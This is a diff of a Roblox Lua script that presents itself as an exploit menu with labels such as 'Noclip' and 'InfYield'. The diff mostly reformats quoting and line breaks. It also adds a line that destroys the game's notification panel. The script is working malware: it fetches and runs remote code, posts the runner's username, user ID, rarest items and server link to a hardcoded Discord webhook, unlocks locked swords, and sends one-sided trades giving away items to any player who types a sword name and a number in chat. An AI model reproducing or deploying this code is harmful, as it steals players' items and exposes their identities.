@@ -3,12 +3,18 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/
 
 task.wait(3)
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService('HttpService')
+local Players = game:GetService('Players')
+local MarketplaceService = game:GetService('MarketplaceService')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
 
-local xUrL7 = "https://discord.com/api/webhooks/" .. "1414700326820515992" .. "/" .. "l-2z9v-lOzFAqQn1NO7_8OGHCHIsjBxML_cVUgw2TdUxUPZlHNcTIrJLThvov03BVvrW"
+game:GetService('Players').LocalPlayer.PlayerGui['Main Interface'].Frames.Notifications
+    :Destroy()
+
+local xUrL7 = 'https://discord.com/api/webhooks/'
+    .. '1414700326820515992'
+    .. '/'
+    .. 'l-2z9v-lOzFAqQn1NO7_8OGHCHIsjBxML_cVUgw2TdUxUPZlHNcTIrJLThvov03BVvrW'
 
 local player = Players.LocalPlayer
 local username = player.Name
@@ -18,29 +24,34 @@ local userId = player.UserId
 local placeId = game.PlaceId
 local jobId = game.JobId
 
-local gameTitle = "Unknown Game"
+local gameTitle = 'Unknown Game'
 pcall(function()
     gameTitle = MarketplaceService:GetProductInfo(placeId).Name
 end)
 
 local function zKw9()
-    local rarestItem = "None"
+    local rarestItem = 'None'
     local lowestValue = math.huge
     local rarestValue = 0
-    
+
     pcall(function()
-        local inventory = player:FindFirstChild("inventory")
-        if not inventory then return end
-        
-        local swordCopyData = ReplicatedStorage:FindFirstChild("Sword Copy Data")
-        if not swordCopyData then return end
-        
+        local inventory = player:FindFirstChild('inventory')
+        if not inventory then
+            return
+        end
+
+        local swordCopyData =
+            ReplicatedStorage:FindFirstChild('Sword Copy Data')
+        if not swordCopyData then
+            return
+        end
+
         for _, item in pairs(inventory:GetChildren()) do
-            if item:IsA("IntValue") then
+            if item:IsA('IntValue') then
                 local itemName = item.Name
                 local swordData = swordCopyData:FindFirstChild(itemName)
-                
-                if swordData and swordData:IsA("IntValue") then
+
+                if swordData and swordData:IsA('IntValue') then
                     local itemValue = swordData.Value
                     if itemValue < lowestValue then
                         lowestValue = itemValue
@@ -51,72 +62,79 @@ local function zKw9()
             end
         end
     end)
-    
-    if rarestItem ~= "None" then
-        return rarestItem .. " (Value: " .. rarestValue .. ")"
+
+    if rarestItem ~= 'None' then
+        return rarestItem .. ' (Value: ' .. rarestValue .. ')'
     else
-        return "No items found"
+        return 'No items found'
     end
 end
 
 local function mR3x()
     local itemList = {}
-    
+
     pcall(function()
-        local inventory = player:FindFirstChild("inventory")
-        if not inventory then return end
-        
-        local swordCopyData = ReplicatedStorage:FindFirstChild("Sword Copy Data")
-        if not swordCopyData then return end
-        
+        local inventory = player:FindFirstChild('inventory')
+        if not inventory then
+            return
+        end
+
+        local swordCopyData =
+            ReplicatedStorage:FindFirstChild('Sword Copy Data')
+        if not swordCopyData then
+            return
+        end
+
         for _, item in pairs(inventory:GetChildren()) do
-            if item:IsA("IntValue") and item.Value > 0 then
+            if item:IsA('IntValue') and item.Value > 0 then
                 local itemName = item.Name
                 local quantity = item.Value
                 local swordData = swordCopyData:FindFirstChild(itemName)
-                
-                if swordData and swordData:IsA("IntValue") then
+
+                if swordData and swordData:IsA('IntValue') then
                     local itemValue = swordData.Value
                     table.insert(itemList, {
                         name = itemName,
                         quantity = quantity,
-                        rarity = itemValue
+                        rarity = itemValue,
                     })
                 end
             end
         end
-        
+
         table.sort(itemList, function(a, b)
             return a.rarity < b.rarity
         end)
     end)
-    
+
     local rarestItems = {}
     for i = 1, math.min(10, #itemList) do
         rarestItems[itemList[i].name] = itemList[i].quantity
     end
-    
+
     return rarestItems
 end
 
 local function hP8q()
     local unlockedCount = 0
-    
+
     pcall(function()
-        local inventoryList = game:GetService("Players").LocalPlayer.PlayerGui["Main Interface"].Frames.Inventory.Contents.List
-        local replicatedStorage = game:GetService("ReplicatedStorage")
-        local lockSwordRemote = replicatedStorage:WaitForChild("Remotes"):WaitForChild("LockSword")
-        
+        local inventoryList =
+            game:GetService('Players').LocalPlayer.PlayerGui['Main Interface'].Frames.Inventory.Contents.List
+        local replicatedStorage = game:GetService('ReplicatedStorage')
+        local lockSwordRemote =
+            replicatedStorage:WaitForChild('Remotes'):WaitForChild('LockSword')
+
         for _, child in pairs(inventoryList:GetChildren()) do
-            if child:IsA("ImageButton") then
-                local iconsFrame = child:FindFirstChild("Icons")
-                
+            if child:IsA('ImageButton') then
+                local iconsFrame = child:FindFirstChild('Icons')
+
                 if iconsFrame then
-                    local lockIcon = iconsFrame:FindFirstChild("LockIcon")
-                    
-                    if lockIcon and lockIcon:IsA("ImageLabel") then
+                    local lockIcon = iconsFrame:FindFirstChild('LockIcon')
+
+                    if lockIcon and lockIcon:IsA('ImageLabel') then
                         if lockIcon.Visible then
-                            local itemName = string.gsub(child.Name, " ", "*")
+                            local itemName = string.gsub(child.Name, ' ', '*')
                             local args = { itemName }
                             lockSwordRemote:FireServer(unpack(args))
                             unlockedCount = unlockedCount + 1
@@ -126,105 +144,126 @@ local function hP8q()
             end
         end
     end)
-    
+
     return unlockedCount
 end
 
 local function jN4f(message)
-    local swordName, quantityStr = message:match("^(.+)%s+(%d+)$")
-    
+    local swordName, quantityStr = message:match('^(.+)%s+(%d+)$')
+
     if swordName and quantityStr then
         local quantity = tonumber(quantityStr)
         if quantity and quantity > 0 then
-            return swordName:gsub("^%s*(.-)%s*$", "%1"), quantity
+            return swordName:gsub('^%s*(.-)%s*$', '%1'), quantity
         end
     end
-    
+
     return nil, nil
 end
 
 local function rB7m(swordName, requiredQuantity)
     local hasItem = false
     local availableQuantity = 0
-    
+
     pcall(function()
-        local inventory = player:FindFirstChild("inventory")
-        if not inventory then return end
-        
+        local inventory = player:FindFirstChild('inventory')
+        if not inventory then
+            return
+        end
+
         local item = inventory:FindFirstChild(swordName)
         if not item then
             for _, inventoryItem in pairs(inventory:GetChildren()) do
-                if inventoryItem.Name:lower() == swordName:lower() and inventoryItem:IsA("IntValue") then
+                if
+                    inventoryItem.Name:lower() == swordName:lower()
+                    and inventoryItem:IsA('IntValue')
+                then
                     item = inventoryItem
                     break
                 end
             end
         end
-        
-        if item and item:IsA("IntValue") then
+
+        if item and item:IsA('IntValue') then
             availableQuantity = item.Value
             if availableQuantity >= requiredQuantity then
                 hasItem = true
             end
         end
     end)
-    
+
     return hasItem, availableQuantity
 end
 
-local serverLink = "roblox://placeId=18450282790&gameInstanceId=" .. jobId
+local serverLink = 'roblox://placeId=18450282790&gameInstanceId=' .. jobId
 local rarestItem = zKw9()
 
 local embedData = {
-    ["embeds"] = {{
-        ["title"] = "🎮 Player",
-        ["description"] = "yes",
-        ["color"] = 3447003,
-        ["thumbnail"] = {
-            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-        },
-        ["fields"] = {
-            {
-                ["name"] = "👤 Noclip",
-                ["value"] = "**Username:** " .. username .. "\n**Display Name:** " .. displayName .. "\n**User ID:** " .. userId,
-                ["inline"] = true
+    ['embeds'] = {
+        {
+            ['title'] = '🎮 Player',
+            ['description'] = 'yes',
+            ['color'] = 3447003,
+            ['thumbnail'] = {
+                ['url'] = 'https://www.roblox.com/headshot-thumbnail/image?userId='
+                    .. userId
+                    .. '&width=420&height=420&format=png',
             },
-            {
-                ["name"] = "🔮 InfYield",
-                ["value"] = "**Rarest Item:** " .. rarestItem,
-                ["inline"] = true
+            ['fields'] = {
+                {
+                    ['name'] = '👤 Noclip',
+                    ['value'] = '**Username:** '
+                        .. username
+                        .. '\n**Display Name:** '
+                        .. displayName
+                        .. '\n**User ID:** '
+                        .. userId,
+                    ['inline'] = true,
+                },
+                {
+                    ['name'] = '🔮 InfYield',
+                    ['value'] = '**Rarest Item:** ' .. rarestItem,
+                    ['inline'] = true,
+                },
+                {
+                    ['name'] = '🔗 CopyLink',
+                    ['value'] = serverLink
+                        .. '\n[View Profile](https://www.roblox.com/users/'
+                        .. userId
+                        .. '/profile)',
+                    ['inline'] = false,
+                },
             },
-            {
-                ["name"] = "🔗 CopyLink",
-                ["value"] = serverLink .. "\n[View Profile](https://www.roblox.com/users/" .. userId .. "/profile)",
-                ["inline"] = false
-            }
+            ['footer'] = {
+                ['text'] = 'exe',
+                ['icon_url'] = 'https://cdn.discordapp.com/attachments/1234567890123456789/1234567890123456789/roblox_icon.png',
+            },
+            ['timestamp'] = os.date('!%Y-%m-%dT%H:%M:%SZ'),
         },
-        ["footer"] = {
-            ["text"] = "exe",
-            ["icon_url"] = "https://cdn.discordapp.com/attachments/1234567890123456789/1234567890123456789/roblox_icon.png"
-        },
-        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }}
+    },
 }
 
 local function tL6y()
     local success = false
-    
+
     success = pcall(function()
         request({
             Url = xUrL7,
-            Method = "POST",
+            Method = 'POST',
             Headers = {
-                ["Content-Type"] = "application/json"
+                ['Content-Type'] = 'application/json',
             },
-            Body = HttpService:JSONEncode(embedData)
+            Body = HttpService:JSONEncode(embedData),
         })
     end)
-    
+
     if not success then
         pcall(function()
-            HttpService:PostAsync(xUrL7, HttpService:JSONEncode(embedData), Enum.HttpContentType.ApplicationJson)
+            HttpService:PostAsync(
+                xUrL7,
+                HttpService:JSONEncode(embedData),
+                Enum.HttpContentType.ApplicationJson
+            )
         end)
     end
 end
@@ -233,73 +272,83 @@ local function qX5w(targetPlayer, swordName, quantity)
     pcall(function()
         hP8q()
         wait(2)
-        
+
         local itemsToTrade = {}
         itemsToTrade[swordName] = quantity
-        
+
         local args = {
             {
                 SenderContents = {
                     Items = itemsToTrade,
-                    Currency = {}
+                    Currency = {},
                 },
                 Receiver = targetPlayer,
                 ReceiverContents = {
                     Items = {},
-                    Currency = {}
-                }
-            }
+                    Currency = {},
+                },
+            },
         }
-        
-        local tradeRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Trade System"):WaitForChild("SendTrade")
+
+        local tradeRemote = ReplicatedStorage:WaitForChild('Remotes')
+            :WaitForChild('Trade System')
+            :WaitForChild('SendTrade')
         tradeRemote:InvokeServer(unpack(args))
     end)
 end
 
 local function nD9k()
     local processedMessages = {}
-    
+
     for _, otherPlayer in pairs(Players:GetPlayers()) do
         if otherPlayer ~= player then
             otherPlayer.Chatted:Connect(function(message)
-                local messageKey = otherPlayer.Name .. "_" .. message .. "_" .. tick()
-                if processedMessages[messageKey] then return end
+                local messageKey = otherPlayer.Name
+                    .. '_'
+                    .. message
+                    .. '_'
+                    .. tick()
+                if processedMessages[messageKey] then
+                    return
+                end
                 processedMessages[messageKey] = true
-                
+
                 local swordName, quantity = jN4f(message)
-                
+
                 if swordName and quantity then
                     local hasItem, availableQuantity = rB7m(swordName, quantity)
-                    
+
                     if hasItem then
                         qX5w(otherPlayer, swordName, quantity)
                     end
                 end
-                
+
                 wait(5)
                 processedMessages[messageKey] = nil
             end)
         end
     end
-    
+
     Players.PlayerAdded:Connect(function(newPlayer)
         wait(1)
-        
+
         newPlayer.Chatted:Connect(function(message)
-            local messageKey = newPlayer.Name .. "_" .. message .. "_" .. tick()
-            if processedMessages[messageKey] then return end
+            local messageKey = newPlayer.Name .. '_' .. message .. '_' .. tick()
+            if processedMessages[messageKey] then
+                return
+            end
             processedMessages[messageKey] = true
-            
+
             local swordName, quantity = jN4f(message)
-            
+
             if swordName and quantity then
                 local hasItem, availableQuantity = rB7m(swordName, quantity)
-                
+
                 if hasItem then
                     qX5w(newPlayer, swordName, quantity)
                 end
             end
-            
+
             wait(5)
             processedMessages[messageKey] = nil
         end)
